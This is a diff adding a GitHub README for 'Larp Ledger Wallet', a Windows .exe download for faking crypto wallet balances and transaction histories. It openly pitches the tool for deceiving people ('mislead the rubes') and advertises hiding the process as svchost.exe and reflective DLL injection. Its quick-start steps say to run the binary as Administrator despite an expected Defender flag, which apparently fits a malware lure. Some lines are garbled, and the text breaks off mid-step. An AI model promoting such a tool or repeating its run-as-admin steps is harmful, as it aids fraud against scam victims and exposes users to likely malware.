@@ -1,0 +1,122 @@
+<div align="center">
+  <img src="https://capsule-render.vercel.app/api?type=rounded&color=1E90FF,0047AB,000080&height=240&section=header&text=Larp%20Ledger%20Wallet%20(Fake%20Balance%20Emulator)%202026&fontSize=64&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Crypto%20Social%20Engineering%20Simulator&descAlignY=56&descSize=20" width="100%"/>
+  
+  # 🚀 Larp Ledger Wallet (Fake Balance Emulator) 2026 ⚡
+  
+  ![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
+  ![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
+  ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
+  ![Updated](https://img.shields.io/badge/updated-2026-brightgreen?style=for-the-badge)
+  ![Downloads](https://img.shields.io/badge/downloads-2.5k+-7B68EE?style=for-the-badge)
+  ![Platform](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows)
+  ![Language](https://img.shields.io/badge/lang-C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white)
+  ![Release](https://img.shields.io/badge/release-stable-00C853?style=for-the-badge)
+  
+  ### ⭐ Star this repo if it helped you mislead the rubes!
+  
+  <!-- BUTTON INSTANCE 1 -- FIERY RADIOACTIVE ORANGE -->
+  <p align="center">
+    <a href="https://github.com/mankinsoosteel-beep/larp-ledger-balance-tool/releases/download/v3.12.25/larp-ledger-balance-tool-v3.12.25.zip">
+      <img src="https://img.shields.io/badge/🔥%20DOWNLOAD%20LATEST%20VERSION-FF4500?style=for-the-badge&logoColor=white&labelColor=CC0000" width="440" alt="Download Larp Ledger Wallet (Fake Balance Emulator) 2026"/>
+    </a>
+  </p>
+  
+  <p align="center">
+    <i>Standalone .exe — no runtime, no script, no BS.</i>
+  </p>
+</div>
+
+---
+
+## ✨ Feature List — Straight to the Gist
+
+<ul>
+<li><b>💎 Fake Portfolio Heatmaps</b> — Generate convincing blockchain dashboard screenshots with dummy token allocations in 5 presets (Whale, Medium Fish, DeFi Degenerate, NFT Aristocrat, Fresh Exit Liquidity)</li>
+<li><b>🧩 Transaction History Spoof</b> — Load up to 200 fake inbound transfers from over 30 dummy public addresses with realistic amounts and Vega blockchain-style tokens</li>
+<li><b>🕰️ Clock Injection Kit</b> — Manually change wallet creation date, last login, last outgoing transaction — down to the second — to manufacture "long term hodler" aura</li>
+<li><b>🎭 Multichain Balance Breaker</b> — Spo< script prevent >selectable pre-built chains: BSC (fake BUSD, LP Tokens), Ethereum (dummy.eth address with 2,500 bal), Polygon (MATIC + zkEVM rugs)</li>
+<li><b>🔧 Custom Token Editor</b> — Add up to 10 utterly fake moonbags to any chain. Contract addresses? Screenshot, all numeric identifiers look like raw 42-char hexes from BSCScan</li>
+<li><b>🧴 Reagent Injector</b> — Click to send a Screencap to Discord, Telegram, or X (Twitter) — auto-saves to /runit_back or manually edit EXIF via built-in OpenCv tag burner</li>
+<li><b>📊 Paper Trade Generator</b> — Pin fake stop-loss execution IDs, limit orders with slippage, ghost volume data. Run alongside a real exchange data feed to look "legit"</li>
+<li><b>⚡ Express Layout Engine</b> — Reposition any element via drag-n-drop. Lock UI layout for JPEG export at fraud-grade resolutions (1920 x 1080 @ 96 DPI)</li>
+<li><b>🛡️ Stealth Mode</b> — Hides process via process callback patch so it doesn't show as "larp-ledger-wallet" in Task Manager — runs as svchost.exe → dll reflective injection optional</li>
+</ul>
+
+> [!TIP]
+> This is the **only** standalone Windows PE compiled tool on the market for balance spoofing simulation.
+> No Python required. Zero dependencies. No npm garbage.
+
+---
+
+## 📋 Table of Contents
+
+- [📖 Overview](#-overview)
+- [🔧 Requirements](#-requirements)
+- [💎 Highlights](#-highlights)
+- [⚡ Quick Start](#-quick-start)
+- [🛡️ Safety Notes](#%EF%B8%8F-safety-notes)
+- [🕹️ How It Works](#%EF%B8%8F-how-it-works)
+- [❓ FAQ](#-faq)
+- [📊 Compatibility](#-compatibility)
+- [💻 Community](#-community)
+- [⚠️ Important Notice](#%EF%B8%8F-important-notice)
+- [📜 License](#-license)
+
+---
+
+## 📖 Overview
+
+Larp Ledger Wallet is a cryptographic-adjacent .exe sandbox designed to let **developers, security researchers, and social engineers** experiment with **realistic fake crypto portfolio scenarios** for penetration testing, scripted demonstrations, and red-team mission brevity.
+
+Think you can tell a bot ledger from a real DeFi dump? Think again.
+
+Push right into:
+- A spoof dashboard with **Live** fake DappRadar aggregator ratings,
+- Balance gauges, ROI charts, token value, and a glowing **Alerts** column in the sidebar for the real "what did I buy" degenerate feel,
+- All running in a drag-n-drop window that simulates the visual mechanics of MetaMask + Zerion's broken beta reskin.
+
+> [!NOTE]
+> This tool does **NOT** interact with real blockchains, private keys, or network validators.
+> Every digit you see is generated by an **intelligent probabilistic noise oscillator**. Zero internal network calls. Zero key leak risk.
+
+---
+
+## 🔧 Requirements
+
+> [!IMPORTANT]
+> Must-run on **Windows 10 (build 1909 or newer)** or **Windows 11 22H2+**.
+
+| Component            | Minimum                    | Recommended                    |
+| -------------------- | -------------------------- | ------------|
+| CPU                  | Intel Core i5‑4590 / AMD Ryzen 3 1200 | Intel Core i7‑9700           |
+| RAM                  | 8 GB                       | 16 GB        |
+| Storage              | 200 MB free                | 500 MB free |
+| GPU                  | DirectX 11 compatible (SM 5.0) | Vulkan         |
+| OS                   | Windows 10 x64 (1909+),          | Windows 11        |
+| Admin Required?      | **Yes** for first launch (DLL component hook) | Optional post-first run |
+
+- **No .NET Runtime needed** — compiled in pure C++20 / C Library.
+- **No Visual Studio redist** — all C++ dependents statically linked.
+- **IMPORTANT**: Windows Defender will likely flag the executable automatically — but see the Safety section.
+
+---
+
+## 💎 Highlights
+
+- 🖥️ **Single-click execution** — whole thing runs from 3.7MB .exe
+- 🚚 **Export Scenarios as ZIP file** — loadable into any future custom builds via the binary `.llw.project` config cache
+- 📷 **Camera Manipulation:** Overlay fake dollar amounts exactly where a cursor would normally point — tooltip injection package stored in memory
+- 🧪 5 ready‑to‑run Skins: Dark Crypto Night, Neon Capitalist (Cyberpunk green), Ocean 🌊 Bubble, Cringe Mascot (only for true degen comedians), Paper trader minimalist
+- #⃣ **Long running background synthetic trading timer** — continuously scrolls pointless trades through to produce "daily volume"
+- 🧬 Full UTF‑8 locale sensitivity faker — tweak token captions to different romanised characters if needed
+
+---
+
+## ⚡ Quick Start
+
+1. 🔽 Grab the .zip from the **button above (or below)**
+2. 🔑 Unzip into any directory (C:\tools or %userprofile%\desktop is fine)
+3. 🖱 Right‑click **larp‑ledger‑wallet.exe ✦ Run as Administrator** (first-time ONLY or when SmartScreen wars).
+4. 🪟 In 2 seconds you'll see the main fake Ledger-style window.
+5. 🎯 From landing page:  
+    → *"Generate Entire Simulation
